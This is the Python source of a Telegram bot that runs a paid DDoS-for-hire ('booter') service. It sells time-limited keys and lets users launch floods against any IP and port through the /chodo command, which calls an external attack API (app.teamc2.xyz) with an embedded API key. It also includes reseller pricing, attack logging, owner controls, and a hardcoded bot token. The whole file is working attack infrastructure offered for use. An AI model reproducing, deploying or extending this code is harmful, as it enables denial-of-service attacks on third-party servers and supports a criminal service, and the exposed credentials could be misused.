import telebot
import threading
import os
import random
import string
import re
import sys
from datetime import datetime, timedelta
import time
import requests

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ============= CONFIGURATION =============
BOT_TOKEN = "8628280551:AAHA2VF4Yb_Q0W1enoZz2c0TGiP5kxrU-EY"
BOT_OWNER = 1885926472

# API List for attacks (4 concurrent attacks possible)
API_LIST = [
    "https://app.teamc2.xyz/api/attack?api_key=LMII0G&target={ip}&port={port}&time={time}&concurrent=1",
    "https://app.teamc2.xyz/api/attack?api_key=LMII0G&target={ip}&port={port}&time={time}&concurrent=1",
    "https://app.teamc2.xyz/api/attack?api_key=LMII0G&target={ip}&port={port}&time={time}&concurrent=1",
    "https://app.teamc2.xyz/api/attack?api_key=LMII0G&target={ip}&port={port}&time={time}&concurrent=1",
]

# Settings
DEFAULT_MAX_ATTACK_TIME = 200
DEFAULT_USER_COOLDOWN = 180

# Reseller pricing
RESELLER_PRICING = {
    '12h': {'price': 25, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 50, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 130, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 250, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 750, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 1250, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}

# ============= FILE STORAGE (No MongoDB needed!) =============
DATA_FILE = "bot_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {
        "users": {},
        "keys": {},
        "resellers": {},
        "attack_logs": [],
        "settings": {
            "max_attack_time": 200,
            "user_cooldown": 180,
            "maintenance_mode": False,
            "maintenance_msg": "🔧 Bot maintenance mein hai. Baad mein try karo.",
            "blocked_ips": [],
            "port_protection": True
        }
    }

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2, default=str)

# Load or create data
import json
data = load_data()

bot = telebot.TeleBot(BOT_TOKEN)

# ============= HELPER FUNCTIONS =============
def get_setting(key, default):
    return data["settings"].get(key, default)

def set_setting(key, value):
    data["settings"][key] = value
    save_data(data)

def get_max_attack_time():
    return get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)

def get_user_cooldown_setting():
    return get_setting('user_cooldown', DEFAULT_USER_COOLDOWN)

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot maintenance mein hai. Baad mein try karo.')

def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)

def get_blocked_ips():
    return get_setting('blocked_ips', [])

def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def remove_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False

def get_port_protection():
    return get_setting('port_protection', True)

def check_maintenance(message):
    if is_maintenance() and message.from_user.id != BOT_OWNER:
        bot.reply_to(message, get_maintenance_msg())
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return False
    
    user = data["users"].get(str(user_id))
    if user and user.get('banned'):
        bot.reply_to(message, f"🚫 APKO BAN KAR DIYA GAYA HAI!\n\n📞 Contact Your Seller")
        return True
    return False

def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    
    value = int(match.group(1))
    unit = match.group(2)
    
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    return None, None

def is_owner(user_id):
    return user_id == BOT_OWNER

def is_reseller(user_id):
    reseller = data["resellers"].get(str(user_id))
    return reseller is not None and not reseller.get('blocked')

def get_reseller(user_id):
    return data["resellers"].get(str(user_id))

def has_valid_key(user_id):
    user = data["users"].get(str(user_id))
    if not user or not user.get('key_expiry'):
        return False
    
    expiry = datetime.fromisoformat(user['key_expiry'])
    if datetime.now() > expiry:
        user['key'] = None
        user['key_expiry'] = None
        save_data(data)
        return False
    return True

def get_time_remaining(user_id):
    user = data["users"].get(str(user_id))
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    
    remaining = datetime.fromisoformat(user['key_expiry']) - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def log_attack(user_id, username, target, port, duration):
    data["attack_logs"].append({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now().isoformat()
    })
    save_data(data)

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

# Attack tracking
_attack_lock = threading.Lock()
active_attacks = {}
user_cooldowns = {}
api_in_use = {}

def get_user_cooldown(user_id):
    with _attack_lock:
        if str(user_id) not in user_cooldowns:
            return 0
        remaining = (user_cooldowns[str(user_id)] - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[str(user_id)]
            return 0
        return int(remaining)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack in active_attacks.values():
            if attack.get('user_id') == user_id and attack['end_time'] > now:
                return True
        return False

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            active_attacks.pop(k, None)
            api_in_use.pop(k, None)
        return len(active_attacks)

def get_free_api_index():
    with _attack_lock:
        busy_indices = set(api_in_use.values())
        for i in range(len(API_LIST)):
            if i not in busy_indices:
                return i
        return None

# ============= COMMANDS =============

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    if check_maintenance(message): return
    if check_banned(message): return
    
    response = f'''👋 Welcome, {user_name}!

🔐 Commands:
• /redeem <key> - Key redeem karo
• /mykey - Key details dekho
• /status - Attack status dekho
• /chodo <ip> <port> <time> - Attack start karo

Example: /chodo 1.1.1.1 80 60

👑 Owner Commands:
• /gen <time> <count> - Generate keys
• /max_attack <sec> - Set max time
• /cooldown <sec> - Set cooldown
• /block_ip <prefix> - Block IP range
• /unblock_ip <prefix> - Unblock IP
• /blocked_ips - Show blocked IPs
• /maintenance <msg> - Maintenance ON
• /ok - Maintenance OFF
• /logs - Get attack logs
• /del_logs - Delete logs'''
    
    bot.reply_to(message, response)

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    bot.reply_to(message, f"`{message.from_user.id}`", parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    total_users = len(data["users"])
    maint_status = "✅ Disabled" if not is_maintenance() else "🔴 Enabled"
    uptime_seconds = (datetime.now() - BOT_START_TIME).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    
    response = f"🏓 Pong!\n\n• Response Time: {response_time}ms\n• Bot Status: 🟢 Online\n• Users: {total_users}\n• Maintenance: {maint_status}\n• Uptime: {hours}h {minutes:02d}m {seconds:02d}s"
    bot.reply_to(message, response)

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /gen <duration> <count>\nExample: /gen 1d 1")
        return
    
    duration_str = parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    if not duration:
        bot.reply_to(message, "❌ Invalid format! Use: s/m/h/d")
        return
    
    try:
        count = int(parts[2])
        if count < 1 or count > 50:
            bot.reply_to(message, "❌ Count 1-50 ke beech hona chahiye!")
            return
    except:
        bot.reply_to(message, "❌ Invalid count!")
        return
    
    generated_keys = []
    for _ in range(count):
        key = f"BGMI-{generate_key(12)}"
        data["keys"][key] = {
            'duration_seconds': int(duration.total_seconds()),
            'duration_label': duration_label,
            'created_at': datetime.now().isoformat(),
            'created_by': user_id,
            'used': False,
            'used_by': None,
            'used_at': None
        }
        generated_keys.append(key)
    save_data(data)
    
    if count == 1:
        bot.reply_to(message, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {duration_label}", parse_mode="HTML")
    else:
        keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
        bot.reply_to(message, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", parse_mode="HTML")

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /redeem <key>")
        return
    
    key_input = parts[1]
    key_doc = data["keys"].get(key_input)
    
    if not key_doc:
        bot.reply_to(message, "❌ Invalid key!")
        return
    
    if key_doc.get('used'):
        bot.reply_to(message, "❌ Ye key pehle se use ho chuki hai!")
        return
    
    user = data["users"].get(str(user_id))
    expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
    
    if user and user.get('key_expiry') and datetime.fromisoformat(user['key_expiry']) > datetime.now():
        new_expiry = datetime.fromisoformat(user['key_expiry']) + timedelta(seconds=key_doc['duration_seconds'])
        data["users"][str(user_id)]['key_expiry'] = new_expiry.isoformat()
        data["users"][str(user_id)]['key'] = key_input
        bot.reply_to(message, f"✅ Key Extended!\n\n⏰ Added: {key_doc['duration_label']}\n⏳ Total Time: {get_time_remaining(user_id)}", parse_mode="Markdown")
    else:
        data["users"][str(user_id)] = {
            'user_id': user_id,
            'username': user_name,
            'key': key_input,
            'key_expiry': expiry_time.isoformat(),
            'key_duration_label': key_doc['duration_label'],
            'redeemed_at': datetime.now().isoformat()
        }
        bot.reply_to(message, f"✅ Key Redeemed!\n\n🔑 Key: `{key_input}`\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {get_time_remaining(user_id)}", parse_mode="Markdown")
    
    key_doc['used'] = True
    key_doc['used_by'] = user_id
    key_doc['used_at'] = datetime.now().isoformat()
    save_data(data)

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = data["users"].get(str(user_id))
    if not user or not user.get('key'):
        bot.reply_to(message, "❌ Tumhare paas koi key nahi hai!")
        return
    
    if not has_valid_key(user_id):
        bot.reply_to(message, "❌ Key khatam ho gayi!")
        return
    
    remaining = get_time_remaining(user_id)
    bot.reply_to(message, f"🔑 Key Details\n\n📌 Key: `{user['key']}`\n⏳ Remaining: {remaining}\n✅ Status: Active", parse_mode="Markdown")

@bot.message_handler(commands=["chodo"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id):
        bot.reply_to(message, "❌ Tumhare paas valid key nahi hai!\n\n🔑 Key kharidne ke liye /redeem use karo.")
        return
    
    if not is_owner(user_id):
        cooldown = get_user_cooldown(user_id)
        if cooldown > 0:
            bot.reply_to(message, f"⏳ Cooldown active! Wait: {cooldown}s")
            return
    
    if user_has_active_attack(user_id):
        bot.reply_to(message, "❌ Tumhara pehle se ek attack chal raha hai!")
        return
    
    active_count = get_active_attack_count()
    max_concurrent = len(API_LIST)
    if active_count >= max_concurrent:
        bot.reply_to(message, f"❌ Abhi attack lgi hui hai! ({active_count}/{max_concurrent})\n\n/status se check kro")
        return
    
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /chodo <ip> <port> <time>\nExample: /chodo 1.1.1.1 80 60")
        return
    
    target, port, duration = parts[1], parts[2], parts[3]
    
    if not validate_target(target):
        bot.reply_to(message, "❌ Invalid IP!")
        return
    
    if is_ip_blocked(target):
        bot.reply_to(message, "🚫 Ye IP blocked hai!")
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Invalid port! (1-65535)")
            return
        duration = int(duration)
        
        max_time = get_max_attack_time()
        if not is_owner(user_id) and duration > max_time:
            bot.reply_to(message, f"❌ Max time: {max_time}s")
            return
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        
        if api_index is None:
            bot.reply_to(message, "❌ Koi free slot nahi mila! Wait karo.")
            return
        
        with _attack_lock:
            user_cooldowns[str(user_id)] = datetime.now() + timedelta(seconds=duration + get_user_cooldown_setting())
            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration)
            }
        
        def start_attack():
            try:
                username = message.from_user.username or message.from_user.first_name or str(user_id)
                log_attack(user_id, username, target, port, duration)
                bot.reply_to(message, f"⚡ Attack Started!\n\n🎯 Target: {target}:{port}\n⏱️ Time: {duration}s\n\n📊 /status se check kro")
                
                api_url = API_LIST[api_index].format(ip=target, port=port, time=duration)
                
                def call_api():
                    try:
                        response = requests.get(api_url, timeout=10)
                        print(f"[API] Attack sent to {target}:{port} - Status: {response.status_code}")
                    except Exception as e:
                        print(f"[API] Error: {e}")
                
                t = threading.Thread(target=call_api)
                t.daemon = True
                t.start()
                
                time.sleep(duration)
                
                with _attack_lock:
                    active_attacks.pop(attack_id, None)
                    api_in_use.pop(attack_id, None)
                
                bot.reply_to(message, f"✅ Attack Complete!\n\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s")
            except Exception as e:
                with _attack_lock:
                    active_attacks.pop(attack_id, None)
                    api_in_use.pop(attack_id, None)
                print(f"Attack error: {e}")
        
        thread = threading.Thread(target=start_attack)
        thread.daemon = True
        thread.start()
        
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be numbers!")

def build_status_message(user_id):
    get_active_attack_count()
    cooldown = get_user_cooldown(user_id)
    user_attacks = {k: v for k, v in active_attacks.items()}
    user_attack_count = len(user_attacks)
    
    response = "╔══════════════════════════╗\n"
    response += f"║  🔥 ATTACK STATUS 🔥           ║\n"
    response += "╠══════════════════════════╣\n"
    response += f"║  📊 Total Active: {user_attack_count}               ║\n"
    response += "╚══════════════════════════╝\n"
    
    if user_attacks:
        for attack_info in user_attacks.values():
            remaining = (attack_info['end_time'] - datetime.now()).total_seconds()
            if remaining > 0:
                total = attack_info['duration']
                elapsed = total - remaining
                percent = int((elapsed / total) * 100)
                filled = int(percent / 10)
                empty = 10 - filled
                bar = "🟢" * filled + "⚫" * empty
                
                response += f"\n┌─────────────────────────┐\n"
                response += f"│ 🎯 {attack_info['target']}:{attack_info['port']}\n"
                response += f"│ ⏱️ {int(remaining)}s remaining\n"
                response += f"│ {bar} {percent}%\n"
                response += f"└─────────────────────────┘\n"
    else:
        response += "\n💤 Koi active attack nahi\n"
    
    response += f"\n⚙️ Max Time: {get_max_attack_time()}s"
    if cooldown > 0:
        response += f"\n⏳ Cooldown: {cooldown}s"
    return response

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ Pehle key purchase karo!")
        return
    
    response = build_status_message(user_id)
    bot.reply_to(message, response)

@bot.message_handler(commands=["max_attack"])
def max_attack_command(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, f"⚙️ Current Max Attack Time: {get_max_attack_time()}s\n\nChange: /max_attack <seconds>")
        return
    try:
        new_val = int(parts[1])
        if 10 <= new_val <= 600:
            set_setting('max_attack_time', new_val)
            bot.reply_to(message, f"✅ Max Attack Time set: {new_val}s")
        else:
            bot.reply_to(message, "❌ Value 10-600 seconds ke beech hona chahiye!")
    except:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, f"⏳ Current Cooldown: {get_user_cooldown_setting()}s\n\nChange: /cooldown <seconds>")
        return
    try:
        new_val = int(parts[1])
        if 0 <= new_val <= 3600:
            set_setting('user_cooldown', new_val)
            bot.reply_to(message, f"✅ Cooldown set: {new_val}s")
        else:
            bot.reply_to(message, "❌ Value 0-3600 seconds ke beech hona chahiye!")
    except:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["block_ip"])
def block_ip_command(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /block_ip <ip_prefix>\nExample: /block_ip 192.168.\nExample: /block_ip 10.0.")
        return
    if add_blocked_ip(parts[1]):
        bot.reply_to(message, f"✅ IP Blocked!\n\n🚫 Prefix: {parts[1]}\n\nAb {parts[1]}* se shuru hone wale IPs pe attack nahi lagega.")
    else:
        bot.reply_to(message, f"ℹ️ {parts[1]} already blocked!")

@bot.message_handler(commands=["unblock_ip"])
def unblock_ip_command(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unblock_ip <ip_prefix>")
        return
    if remove_blocked_ip(parts[1]):
        bot.reply_to(message, f"✅ IP Unblocked!\n\n✅ Prefix: {parts[1]}")
    else:
        bot.reply_to(message, f"❌ {parts[1]} not found in blocked list!")

@bot.message_handler(commands=["blocked_ips"])
def blocked_ips_command(message):
    if not is_owner(message.from_user.id): return
    blocked = get_blocked_ips()
    if not blocked:
        bot.reply_to(message, "📋 Koi IP blocked nahi hai!")
        return
    response = "🚫 BLOCKED IPs\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. {ip}*\n"
    response += f"\n📊 Total: {len(blocked)}"
    bot.reply_to(message, response)

@bot.message_handler(commands=["prot_on"])
def prot_on_command(message):
    if not is_owner(message.from_user.id): return
    set_setting('port_protection', True)
    bot.reply_to(message, "✅ Port Spam Protection enabled!")

@bot.message_handler(commands=["prot_off"])
def prot_off_command(message):
    if not is_owner(message.from_user.id): return
    set_setting('port_protection', False)
    bot.reply_to(message, "✅ Port Spam Protection disabled!")

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /maintenance <message>\n\nExample: /maintenance Bot update ho raha hai, 10 min wait karo")
        return
    set_maintenance(True, parts[1])
    bot.reply_to(message, f"🔧 Maintenance Mode ON!\n\nMessage: {parts[1]}\n\n/ok se band karo")

@bot.message_handler(commands=["ok"])
def ok_command(message):
    if not is_owner(message.from_user.id): return
    if not is_maintenance():
        bot.reply_to(message, "ℹ️ Maintenance mode pehle se OFF hai!")
        return
    set_maintenance(False)
    bot.reply_to(message, "✅ Maintenance Mode OFF!\n\nBot ab normal hai.")

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    if not is_owner(message.from_user.id): return
    if not data["attack_logs"]:
        bot.reply_to(message, "📋 Koi attack logs nahi hai!")
        return
    
    content = "═══════════════════════════\n"
    content += "       ATTACK LOGS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    content += f"Total Attacks: {len(data['attack_logs'])}\n\n"
    content += "───────────────────────────\n"
    
    for i, log in enumerate(data["attack_logs"][-50:], 1):
        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n"
        content += f"   Target: {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n"
        content += f"   Duration: {log.get('duration', 'N/A')}s\n"
        if log.get('timestamp'):
            content += f"   Time: {log['timestamp']}\n"
        content += "\n"
    
    content += "═══════════════════════════\n"
    content += f"END OF LOGS - Total: {len(data['attack_logs'])}\n"
    content += "═══════════════════════════"
    
    file = open("logs_temp.txt", "w")
    file.write(content)
    file.close()
    
    with open("logs_temp.txt", "rb") as f:
        bot.send_document(message.chat.id, f, caption=f"📊 Attack Logs\n\n⚔️ Total Attacks: {len(data['attack_logs'])}")
    os.remove("logs_temp.txt")

@bot.message_handler(commands=["del_logs"])
def delete_logs_command(message):
    if not is_owner(message.from_user.id): return
    count = len(data["attack_logs"])
    if count == 0:
        bot.reply_to(message, "📋 Koi logs nahi hai!")
        return
    data["attack_logs"] = []
    save_data(data)
    bot.reply_to(message, f"✅ {count} attack logs delete ho gaye!")

# ============= MAIN =============
print("="*60)
print("🤖 BOT STARTING...")
print("="*60)
print(f"✅ Bot Token: {BOT_TOKEN[:15]}...")
print(f"✅ Owner ID: {BOT_OWNER}")
print(f"✅ API Endpoints: {len(API_LIST)}")
print(f"✅ Storage: JSON File (bot_data.json)")
print(f"✅ Max Attack Time: {get_max_attack_time()}s")
print(f"✅ Cooldown: {get_user_cooldown_setting()}s")
print("="*60)
print("🎯 Bot is ready! Waiting for commands...")
print("="*60)

while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print(f"Polling crashed: {e}, restarting in 3 seconds...")
        time.sleep(3)